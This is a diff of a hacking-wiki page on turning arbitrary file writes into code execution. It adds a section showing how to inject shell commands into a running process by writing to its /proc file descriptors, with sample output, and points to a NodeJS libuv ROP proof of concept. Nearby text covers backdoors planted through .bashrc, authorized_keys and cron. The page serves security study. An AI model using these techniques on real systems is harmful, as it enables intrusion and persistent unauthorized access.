@@ -185,7 +185,7 @@ ANYTHING
 
 The above will execute when the correct Python version is launched even when the "ANYTHING" part is invalid syntax, it only needs to be valid UTF-8.
 
-### Templates - dirty
+### Templates (dirty)
 
 If source code is not writable or isn't reloaded, another simple method is overwriting templates that can execute code. There are many different templating engines that all use their own syntax and context, some more restricted than others. But most of them have ways to execute arbitrary code or at least read some secrets. Read the full Server-Side Template Injection page to see if your case fits:
 
@@ -217,7 +217,7 @@ Here are a few easy examples:
 
 If you cannot directly write or execute source code, the configuration of an application or server can often also have large exploitable areas. You may be able to set shell commands directly in here, or change the configuration in some way to aid another method.
 
-### `.ssh/authorized_keys` - dirty
+### `.ssh/authorized_keys` (dirty)
 
 When SSH is set up on a server, every shell user can have an `.ssh/` directory inside their home directory containing their public and private key, as well as an `authorized_keys` file that contains all the **public keys** allowed to log in as this user, **separated by newlines**.&#x20;
 
@@ -278,7 +278,7 @@ The repository below shows some more techniques using `.htaccess` file to get RC
 Repository containing various tricks to get RCE using .htaccess files alone
 {% endembed %}
 
-### uWSGI magic variables - dirty
+### uWSGI magic variables (dirty)
 
 {% embed url="https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html" %}
 Overwriting `uwsgi.ini` files containing syntax to execute shell commands
@@ -357,7 +357,7 @@ There are multiple places for such files, but often these are only writable by t
 * `/var/spool/cron/crontabs/$USER`: File per user with cron syntax, often edited manually with `crontab -e`. The filename is the username it executes as.
 * `/etc/cron.hourly`, `.daily`, etc.: Bash scripts that cron will also execute every hour, day, week or month. These may be dirty too as they are only bash scripts and don't require special syntax.
 
-### Bash Profile - dirty
+### Bash Profile (dirty)
 
 Another way is creating a **backdoor** in the user's home directory. For Bash, the `~/.bashrc` file is most common as it executes in any non-login interactive shell. However, for login shells like SSH, a few more are executed in the following order. The _first_ readable file is the _only_ one that executes:
 
@@ -377,6 +377,56 @@ As this only requires writing a bash script at the location, it may include any 
 </strong># test it locally:
 bash example.png
 </code></pre>
+
+### Sending Input
+
+_Piped commands_ in Linux work by simply starting all given programs at the same time, and chaining their input and output streams together. The following command, for example, will connect `sleep`'s 1 (STDOUT) with `sh`'s 0 (STDIN):
+
+```bash
+sleep 999999 | sh
+```
+
+<pre class="language-shell-session" data-title="In another terminal"><code class="lang-shell-session"><strong>$ ls -l /proc/$(pidof sleep)/fd
+</strong>lrwx------ 1 user user 0 -> /dev/pts/0
+<strong>l-wx------ 1 user user 1 -> 'pipe:[22221]'
+</strong>lrwx------ 1 user user 2 -> /dev/pts/0
+<strong>$ ls -l /proc/$(pidof sh)/fd
+</strong><strong>lr-x------ 1 user user 0 -> 'pipe:[22221]'
+</strong>lrwx------ 1 user user 1 -> /dev/pts/0
+lrwx------ 1 user user 2 -> /dev/pts/0
+</code></pre>
+
+With an arbitrary file write vulnerability, you can write to this pipe! This allows you to send input through to the receiving end of the pipe, which may process it insecurely. In this case of `sh`, it will execute any commands received through STDIN:
+
+```bash
+echo id > /proc/$(pidof sh)/fd/0
+```
+
+<pre class="language-shell-session" data-title="Receiving end"><code class="lang-shell-session">$ sleep 999999 | sh
+<strong>uid=1000(user) gid=1000(user) groups=1000(user)
+</strong></code></pre>
+
+Apart from pipes, this same idea applies to opened **sockets**. Some programs will open sockets for communication between each other, but you can write to this too. If the receiving end handles these insecurely you may be able to execute code similar to what's shown above.
+
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ ls -l /proc/$(pidof node)/fd
+</strong>lrwx------ 1 root root 64 Mar 11 19:46 0 -> /dev/null
+l-wx------ 1 root root 64 Mar 11 19:46 1 -> 'pipe:[78136]'
+lr-x------ 1 root root 64 Mar 11 19:46 10 -> 'pipe:[75187]'
+l-wx------ 1 root root 64 Mar 11 19:46 11 -> 'pipe:[75187]'
+lrwx------ 1 root root 64 Mar 11 19:46 12 -> 'anon_inode:[eventfd]'
+lrwx------ 1 root root 64 Mar 11 19:46 13 -> 'anon_inode:[eventpoll]'
+lr-x------ 1 root root 64 Mar 11 19:46 14 -> 'pipe:[81949]'
+<strong>l-wx------ 1 root root 64 Mar 11 19:46 15 -> 'pipe:[81949]'
+</strong>lrwx------ 1 root root 64 Mar 11 19:46 16 -> 'anon_inode:[eventfd]'
+</code></pre>
+
+Specifically, you often see binary protocols used in these sockets. In the case of NodeJS, it uses a library named _libuv_ to which it will send structs containing function pointers. If you're familiar with Binary Exploitation, you'll know that this sounds like a recipe for jumping around the binary to unintended locations, and with the disabled protections by default and control over the stack, this becomes consistently exploitable.
+
+This idea was [first found by Seunghyun Lee](https://hackerone.com/reports/2260337), and later publicized in ["Sonar Research: Why Code Security Matters - Even in Hardened Environments"](https://www.sonarsource.com/blog/why-code-security-matters-even-in-hardened-environments/). This adds the restriction of the file write being valid UTF-8, requiring all [return-oriented-programming-rop](../../binary-exploitation/return-oriented-programming-rop/ "mention") gadget's addresses to be so as well. This makes it possible to get RCE from an Arbitrary File Write vulnerability on a read-only filesystem!
+
+{% embed url="https://github.com/JorianWoltjer/nodejs-file-write-rce" %}
+PoC of NodeJS RCE using ropchain in libuv
+{% endembed %}
 
 ## Deserialization
 
